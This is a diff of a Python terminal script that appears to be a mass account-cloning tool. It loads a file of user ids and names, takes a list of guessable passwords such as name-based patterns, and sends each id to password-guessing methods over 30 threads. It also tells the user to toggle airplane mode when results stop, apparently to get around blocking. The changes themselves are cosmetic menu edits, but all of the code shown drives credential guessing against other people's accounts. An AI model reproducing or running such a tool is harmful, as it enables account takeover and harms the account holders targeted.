@@ -299,7 +299,7 @@ def zar0():
     print(f'{rad}[{white}C{rad}] {green}KEEP ON RANDOM CLONE')
     print(f'{rad}[{white}C{rad}] {green}JOIN GROUP')
     print(f'{rad}[{white}C{rad}] {green}CONTRACK ADMIN');linex()
-    __zar0__ = input(f'{rad}[{white}◆{rad}] {green}Selection  {white}▶︎ {yelloww}')
+    __zar0__ = input(f'{rad}[{white}🔖{rad}] {green}Selection  {white}▶︎ {yelloww}')
     if __zar0__ in ['A','a','01','1']:__FILEX__()
     elif __zar0__ in ['B','b','02','2']:os.system('python3 FILE-DUMP.py')
     elif __zar0__ in ['C','c','03','3']:SETINGX()
@@ -313,7 +313,7 @@ def SETINGX():
     print(f"{K} [{H}1{K}] {WHITE}RANDOM WITH BANGLADESH")
     print(f"{K} [{H}2{K}] {WHITE}RANDOM WITH INDIA V2")
     print(f"{K} [{H}3{K}] {WHITE}RANDOM WITH ALL COUNTRY");linex()
-    __zar0i__ = input(f'{rad}[{white}◆{rad}]{green} SELECTION  {white}▶︎ {yelloww}')
+    __zar0i__ = input(f'{rad}[{white}🔖{rad}]{green} SELECTION  {white}▶︎ {yelloww}')
     if __zar0i__ in ['A','a','01','1']:RANDOM()
     elif __zar0i__ in ['B','b','02','2']:INDIA()
     elif __zar0i__ in ['C','c','03','3']:PAKISTAN()
@@ -506,23 +506,23 @@ def m1(ids,pwv):
 def __FILEX__():
     global oks,cps
     ____banner____()
-    dfile = input(f'{rad}[{white}◆{rad}] {green}EXAMPLE {rad}[{white}sdcard/zar0.txt{rad}]\n{rad}[{white}◆{rad}] {green}INPUT FILE PATH {white}▶︎ {yelloww}');linex()
+    dfile = input(f'{rad}[{white}🔖{rad}] {green}EXAMPLE {rad}[{white}sdcard/zar0.txt{rad}]\n{rad}[{white}🔖{rad}] {green}INPUT FILE PATH {white}▶︎ {yelloww}');linex()
     try:
         dx = open(dfile,'r').read().splitlines()
     except FileNotFoundError:
         print(f'{rad}[×] FILE NOT FOUND...');time.sleep(1);__FILEX__()
     dplist = []
     try:
-        pass_lmit = int(input(f'{rad}[{white}◆{rad}] {green}INPUT PASS LIMITS {white}▶︎ {yelloww}'));linex()
+        pass_lmit = int(input(f'{rad}[{white}🔖{rad}] {green}INPUT PASS LIMITS {white}▶︎ {yelloww}'));linex()
     except:
         pass_lmit = 3
     for i in range(pass_lmit):
-        dplist.append(input(f'{rad}[{white}◆{rad}] {green}EXAMPLE {rad}[{white}firstlast first123 ETC{rad}]\n{rad}[{white}◆{rad}] {green}PASSWORD NO.{i+1} {white}▶︎ {yelloww}'));linex()
-    __METHOD__ = input(f"{rad}[{white}A{rad}]{green} METHOD M1 {rad}({white}INDIA{rad})\n{rad}[{white}B{rad}] {green}METHOD M2 {rad}({white}BD/INDIA{rad})\n{rad}[{white}C{rad}] {green}METHOD M3 {rad}({white}BD/INDIA{rad})\n{rad}[{white}D{rad}] {green}METHOD M4 {rad}({white}BD/INDIA{rad})\n{rad}[{white}E{rad}] {green}METHOD M5 {rad}({white}MIX IDS{rad})\n{rad}[{white}F{rad}] {green}METHOD M6 {rad}({white}ALL COUNTRY{rad})\n{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n{rad}[{white}◆{rad}] {green}SELECTION {white}▶︎ {yelloww}")
+        dplist.append(input(f'{rad}[{white}🔖{rad}] {green}EXAMPLE {rad}[{white}firstlast-first@12-ETC{rad}]\n{rad}[{white}🔖{rad}] {green}PASSWORD ➡️{i+1} {white}▶︎ {yelloww}'));linex()
+    __METHOD__ = input(f"{rad}[{white}A{rad}]{green} METHOD M1\n{rad}[{white}B{rad}] {green}METHOD M2 \n{rad}[{white}C{rad}] {green}METHOD M3 \n{rad}[{white}D{rad}] {green}METHOD M4\n{rad}[{white}E{rad}] {green}METHOD M5 \n{rad}[{white}F{rad}] {green}METHOD M6 \n{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n{rad}[{white}🔖{rad}] {green}SELECTION {white}▶︎ {yelloww}")
     with ThreadPool(max_workers=30) as zar0:
         ____banner____();total_ids = str(len(dx))
-        print(f'{rad}[{white}◆{rad}] {green}TOTAL IDS  {white}▶︎ \x1b[38;5;38m{total_ids}{rad}┼{green}METHOD {white}▶︎ \x1b[38;5;38m{__METHOD__}')
-        print(f'{rad}[{white}◆{rad}] {green}IF NO RESULT [{white}On/Off{green}] AIRPLANE MODE')
+        print(f'{rad}[{white}🔖{rad}] {green}TOTAL IDS  {white}▶︎ \x1b[38;5;38m{total_ids}{rad}┼{green}METHOD {white}▶︎ \x1b[38;5;38m{__METHOD__}')
+        print(f'{rad}[{white}🔖{rad}] {green}IF NO RESULT [{white}On/Off{green}] AIRPLANE MODE')
         linex()
         for user in dx:
             ids,names = user.split('|')
@@ -542,8 +542,8 @@ def __FILEX__():
             else:
                 zar0.submit(__MTDONEE__,ids,names,passlist,total_ids)
     print('');linex()
-    print(f"{rad}[{white}◆{rad}] {green}THE PROCESS HAS COMPLETE")
-    print(f"{rad}[{white}◆{rad}] {green}TOTAL OKS  {white}▶︎ {green}{len(oks)}")
+    print(f"{rad}[{white}🔖{rad}] {green}THE PROCESS HAS COMPLETE")
+    print(f"{rad}[{white}🔖{rad}] {green}TOTAL OKS  {white}▶︎ {green}{len(oks)}")
     linex();exit()
 
 def __MTDONEE__(ids, names, passlist, total_ids):
